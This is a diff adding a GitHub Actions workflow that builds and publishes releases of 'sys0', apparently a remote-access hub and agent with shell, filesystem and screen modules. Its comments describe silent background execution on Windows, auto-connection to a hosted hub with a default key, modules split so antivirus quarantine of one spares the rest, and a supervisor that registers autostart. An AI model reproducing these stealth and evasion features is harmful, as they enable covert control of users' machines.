@@ -1,0 +1,185 @@
+name: Rolling Release
+
+# Rolling release: every push to main is published as a release versioned with
+# the build timestamp (yyyyMMddhhmm).
+on:
+  push:
+    branches: [main]
+    paths-ignore:
+      - "**.md"
+      - "docs/**"
+      - ".github/workflows/ci.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  version:
+    runs-on: ubuntu-latest
+    outputs:
+      version: ${{ steps.v.outputs.version }}
+    steps:
+      - id: v
+        run: echo "version=$(date -u +%Y%m%d%H%M)" >> "$GITHUB_OUTPUT"
+
+  create-release:
+    needs: version
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Create release ${{ needs.version.outputs.version }}
+        env:
+          GH_TOKEN: ${{ github.token }}
+          VERSION: ${{ needs.version.outputs.version }}
+        run: |
+          gh release create "$VERSION" \
+            --target "$GITHUB_SHA" \
+            --title "$VERSION" \
+            --notes "Rolling release · build $VERSION · commit ${GITHUB_SHA:0:7}" \
+            --latest
+
+  build:
+    needs: [version, create-release]
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - { goos: linux, goarch: amd64 }
+          - { goos: linux, goarch: arm64 }
+          - { goos: darwin, goarch: amd64 }
+          - { goos: darwin, goarch: arm64 }
+          - { goos: windows, goarch: amd64 }
+          - { goos: windows, goarch: arm64 }
+    steps:
+      - uses: actions/checkout@v4
+
+      # Rebuild the console so the hub embeds the latest UI.
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci && npm run build
+        working-directory: sys0-console
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+          cache: true
+
+      - name: Set up Zig (for sys0-rescue)
+        run: |
+          set -e
+          ZIG_VERSION=0.16.0
+          curl -fsSL "https://ziglang.org/download/${ZIG_VERSION}/zig-x86_64-linux-${ZIG_VERSION}.tar.xz" -o /tmp/zig.tar.xz
+          mkdir -p "$HOME/zig"
+          tar -xJf /tmp/zig.tar.xz -C "$HOME/zig" --strip-components=1
+          echo "$HOME/zig" >> "$GITHUB_PATH"
+          "$HOME/zig/zig" version
+
+      - name: Build & package
+        env:
+          GOOS: ${{ matrix.goos }}
+          GOARCH: ${{ matrix.goarch }}
+          VERSION: ${{ needs.version.outputs.version }}
+          # Hosted-hub connection defaults baked into the standalone /dl agent.
+          # Override via repository/organization variables of the same name.
+          SYS0_DEFAULT_HUB: ${{ vars.SYS0_DEFAULT_HUB || 'sys0.facrd.xyz' }}
+          SYS0_DEFAULT_TRANSPORT: ${{ vars.SYS0_DEFAULT_TRANSPORT || 'wss' }}
+          SYS0_DEFAULT_KEY: ${{ vars.SYS0_DEFAULT_KEY || 'devkey' }}
+        run: |
+          set -e
+          ext=""
+          [ "$GOOS" = "windows" ] && ext=".exe"
+          ldflags="-s -w -X main.version=$VERSION"
+          dist="sys0_${VERSION}_${GOOS}_${GOARCH}"
+          mkdir -p "$dist"
+          # Bundled binaries keep localhost defaults (good for self-hosters who
+          # run their own hub from the same tarball).
+          go build -trimpath -ldflags "$ldflags" -o "$dist/sys0-hub$ext" ./sys0-hub
+          go build -trimpath -ldflags "$ldflags" -o "$dist/sys0-agent$ext" ./sys0-agent
+          cp README.md "$dist/" 2>/dev/null || true
+          if [ "$GOOS" = "windows" ]; then
+            zip -r "$dist.zip" "$dist"
+            echo "ASSET=$dist.zip" >> "$GITHUB_ENV"
+          else
+            tar czf "$dist.tar.gz" "$dist"
+            echo "ASSET=$dist.tar.gz" >> "$GITHUB_ENV"
+          fi
+          # Publish a STANDALONE agent for the hub's /dl page. This one bakes in
+          # the hosted hub's connection defaults so a zero-arg launch (e.g. a
+          # double-click) connects straight to ${SYS0_DEFAULT_HUB} over wss.
+          # Override defaults via repo/org variables if the hosted hub moves.
+          agent_ldflags="$ldflags             -X main.defaultHub=${SYS0_DEFAULT_HUB}             -X main.defaultTransport=${SYS0_DEFAULT_TRANSPORT}             -X main.defaultKey=${SYS0_DEFAULT_KEY}"
+          # On Windows the standalone agent is meant to be double-clicked, so
+          # link it as a GUI subsystem binary (-H=windowsgui): it runs silently
+          # in the background with NO console window popping up. (The bundled
+          # tarball agent above keeps the console subsystem so self-hosters
+          # running it from a shell still see logs.)
+          if [ "$GOOS" = "windows" ]; then
+            agent_ldflags="$agent_ldflags -H=windowsgui"
+          fi
+          agent_asset="sys0-agent_${VERSION}_${GOOS}_${GOARCH}${ext}"
+          go build -trimpath -ldflags "$agent_ldflags" -o "$agent_asset" ./sys0-agent
+          echo "AGENT_ASSET=$agent_asset" >> "$GITHUB_ENV"
+
+          # MODULAR AGENTS: build one standalone binary PER module (core/shell/
+          # fs/screen). Each is compiled with build tags that PHYSICALLY EXCLUDE
+          # the other modules' code, so AV-quarantining one (e.g. screen) can't
+          # touch the others. The hub re-aggregates a node's module connections by
+          # their shared fingerprint. Named sys0-agentmod-<module>_<ver>_<os>_<arch>
+          # so the hub classifies them as kind=agent with a module dimension.
+          module_assets=""
+          for mod in core shell fs screen; do
+            mod_ldflags="$agent_ldflags -X main.module=$mod"
+            if [ "$GOOS" = "windows" ]; then
+              mod_ldflags="$mod_ldflags -H=windowsgui"
+            fi
+            mod_asset="sys0-agentmod-${mod}_${VERSION}_${GOOS}_${GOARCH}${ext}"
+            CGO_ENABLED=0 go build -trimpath -tags "modular mod_${mod}" -ldflags "$mod_ldflags" -o "$mod_asset" ./sys0-agent
+            module_assets="$module_assets $mod_asset"
+          done
+          echo "MODULE_ASSETS=$module_assets" >> "$GITHUB_ENV"
+
+          # Build the standalone sys0-rescue (Zig): a tiny, static supervisor/
+          # bootstrapper that downloads + keepalives + rescues the agent, and can
+          # register boot/login autostart. One asset per platform, like the agent.
+          case "${GOOS}_${GOARCH}" in
+            linux_amd64)   ztarget=x86_64-linux-musl ;;
+            linux_arm64)   ztarget=aarch64-linux-musl ;;
+            darwin_amd64)  ztarget=x86_64-macos ;;
+            darwin_arm64)  ztarget=aarch64-macos ;;
+            windows_amd64) ztarget=x86_64-windows ;;
+            windows_arm64) ztarget=aarch64-windows ;;
+            *) echo "no zig target for ${GOOS}_${GOARCH}"; ztarget="" ;;
+          esac
+          if [ -n "$ztarget" ]; then
+            rescue_asset="sys0-rescue_${VERSION}_${GOOS}_${GOARCH}${ext}"
+            # Bake the hosted-hub defaults + version into the standalone /dl rescue
+            # (single-file Zig builds can't take -X linker defines, so patch the
+            # source consts in a throwaway copy before compiling).
+            rm -rf /tmp/rescue-build && cp -r sys0-rescue /tmp/rescue-build
+            sed -i \
+              -e "s|^const default_hub = .*|const default_hub = \"${SYS0_DEFAULT_HUB}\";|" \
+              -e "s|^pub const default_key = .*|pub const default_key = \"${SYS0_DEFAULT_KEY}\";|" \
+              -e "s|^pub const rescue_version = .*|pub const rescue_version = \"${VERSION}\";|" \
+              /tmp/rescue-build/src/main.zig
+            # On Windows the /dl rescue is double-clicked, so link it as a GUI
+            # subsystem binary: it runs with NO console window (logs go to a file
+            # in the data dir — see newLogSink). Other targets stay console.
+            zig_extra=""
+            [ "$GOOS" = "windows" ] && zig_extra="--subsystem windows"
+            ( cd /tmp/rescue-build && zig build-exe src/main.zig -O ReleaseSmall -target "$ztarget" $zig_extra -fstrip --name sys0-rescue )
+            mv "/tmp/rescue-build/sys0-rescue${ext}" "$rescue_asset"
+            echo "RESCUE_ASSET=$rescue_asset" >> "$GITHUB_ENV"
+          fi
+
+      - name: Upload to release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          VERSION: ${{ needs.version.outputs.version }}
+        run: |
+          gh release upload "$VERSION" "$ASSET" --clobber
+          gh release upload "$VERSION" "$AGENT_ASSET" --clobber
+          for ma in ${MODULE_ASSETS:-}; do gh release upload "$VERSION" "$ma" --clobber; done
+          [ -n "${RESCUE_ASSET:-}" ] && gh release upload "$VERSION" "$RESCUE_ASSET" --clobber || true
